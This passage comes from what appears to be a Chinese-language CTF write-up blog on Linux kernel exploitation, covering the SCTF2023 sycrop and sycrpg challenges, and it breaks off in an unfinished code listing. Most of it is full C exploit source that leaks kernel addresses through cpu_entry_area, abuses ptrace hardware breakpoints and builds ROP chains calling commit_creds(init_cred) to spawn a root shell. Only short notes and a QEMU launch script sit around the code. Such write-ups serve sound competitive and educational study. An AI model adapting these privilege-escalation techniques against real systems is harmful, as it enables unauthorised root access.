class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br>    <br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        <span class="hljs-keyword">switch</span> (step)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            uname(uts);<br>            <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>                write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>                step++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Wait for ROP chain&quot;</span>);<br>            <span class="hljs-keyword">if</span> (read(rop_pipe[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE) &lt; <span class="hljs-number">0</span>)<br>                err_exit(<span class="hljs-string">&quot;read ROP chain&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Get ROP chain successfully&quot;</span>);<br>            step++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Try to write ROP chain&quot;</span>);<br>            <span class="hljs-comment">// path 2</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">mm_map</span>;</span><br>            mm_map.start_code  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_code    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_data  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_data    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_brk   = <span class="hljs-number">0x2000000</span>;<br>            mm_map.brk         = <span class="hljs-number">0x2000000</span>;<br>            mm_map.start_stack = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.auxv        = MMAP_ADDR;<br>            mm_map.auxv_size   = <span class="hljs-number">0x140</span>;<br>            mm_map.exe_fd      = <span class="hljs-number">-2</span>;<br>            prctl(PR_SET_MM, PR_SET_MM_MAP, &amp;mm_map, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> leak;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br>    <br>    mmap_addr = mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!mmap_addr)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br><br>    pipe(pipe_fd);<br>    pipe(rop_pipe);<br><br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;canary, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname)+<span class="hljs-number">0X20</span>, <span class="hljs-number">8</span>);<br>    kernel_offset = leak -  <span class="hljs-number">0xffffffff810e0b32</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary is 0x%lx\n&quot;</span>, canary);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    pop_rdi += kernel_offset;<br>    commit_creds += kernel_offset;<br>    init_cred += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br>    <br><br>    <span class="hljs-built_in">memset</span>(MMAP_ADDR, <span class="hljs-number">0</span> , MMAP_SIZE);<br>    <span class="hljs-type">size_t</span> *rop_chain = mmap_addr;<br>    <span class="hljs-type">int</span> idx;<br>    idx = <span class="hljs-number">0x30</span>;<br>    rop_chain[idx] = canary;<br>    idx += <span class="hljs-number">7</span>;<br>    rop_chain[idx++] = pop_rdi;<br>    rop_chain[idx++] = init_cred;<br>    rop_chain[idx++] = commit_creds;<br>    rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[idx++] = user_cs;<br>    rop_chain[idx++] = user_rflags;<br>    rop_chain[idx++] = user_sp;<br>    rop_chain[idx++] = user_ss;<br><br><br>    write(rop_pipe[<span class="hljs-number">1</span>], rop_chain, MMAP_SIZE);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SCTF2023-sycrop"><a href="#SCTF2023-sycrop" class="headerlink" title="SCTF2023-sycrop"></a>SCTF2023-sycrop</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123544.png" style="zoom:50%;" /><h4 id="0x5555"><a href="#0x5555" class="headerlink" title="0x5555"></a>0x5555</h4><p>任意地址读8字节</p><h4 id="0x6666"><a href="#0x6666" class="headerlink" title="0x6666"></a>0x6666</h4><p>经过调试发现就是<code>call rdx</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>通过任意地址读一个<code>cpu_entry_area</code>中的一个<code>data</code>泄露<code>kalsr</code>，然后设置硬件断点，布置好寄存器后触发硬件断点，跳转到寄存器在<code>cpu_entry_area</code>的<code>DB stack</code>处执行rop链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> status;<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> syc_regs_37 = <span class="hljs-number">0xffffffff81eec205</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> leak;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff81002c9d</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810bb5b0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a4cbf8</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode  = <span class="hljs-number">0xffffffff82000ed0</span> + <span class="hljs-number">49</span>;<br><br><span class="hljs-comment">// 0xffffffff811ff188 : add rsp, 0x68 ; jmp 0xffffffff82203340</span><br><span class="hljs-comment">// 0xffffffff81002c9d: pop rdi; ret;</span><br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810bb5b0</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82a4cbf8</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff82000ed0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><span class="hljs-type">size_t</span> get_root_func = (<span class="hljs-type">size_t</span>)get_root_shell;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/seven&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br><br>    leak = ioctl(dev_fd, <span class="hljs-number">0x5555</span>, <span class="hljs-number">0xfffffe0000002f38</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>,leak);<br>    kernel_offset = leak - syc_regs_37;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>,kernel_offset);<br><br>    commit_creds += kernel_offset;<br>    init_cred += kernel_offset;<br>    pop_rdi += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br><br>    hbp_pid = fork();<br>    <span class="hljs-keyword">if</span> (hbp_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        ptrace(PTRACE_TRACEME,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br>        raise(SIGSTOP);<br>        __asm__(<br>        <span class="hljs-string">&quot;mov r15,   pop_rdi;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   init_cred;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   get_root_func;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   user_cs;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    user_rflags;&quot;</span>   <br>        <span class="hljs-string">&quot;mov r8,    user_sp;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   user_ss;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xdeadbeef;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   0xdeadbeef;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   buf;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   [rsi];&quot;</span><br>    );<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);<br>    create_hbp(buf);<br><br>    ptrace(PTRACE_CONT,hbp_pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);            <br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);          <br><br>    ptrace(PTRACE_CONT,hbp_pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);     <br><br>    ioctl(dev_fd,<span class="hljs-number">0x6666</span>,<span class="hljs-number">0xfffffe0000010f58</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SCTF2023-sycrpg"><a href="#SCTF2023-sycrpg" class="headerlink" title="SCTF2023-sycrpg"></a>SCTF2023-sycrpg</h2><p>PS:启动脚本有点bug，建议手动指定多核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>    -cpu kvm64,+smep,+smap\<br>    -netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>    -nographic \<br>    -no-reboot \<br>    -smp 2 \<br>    -s<br></code></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123619.png" style="zoom:50%;" /><p>满足条件后即可选定一个任意地址（选了之后就固定了）写一字节</p><p>那还是hack rcx，没什么区别</p><h3 id="FINAL-EXP"><a href="#FINAL-EXP" class="headerlink" title="FINAL EXP"></a>FINAL EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 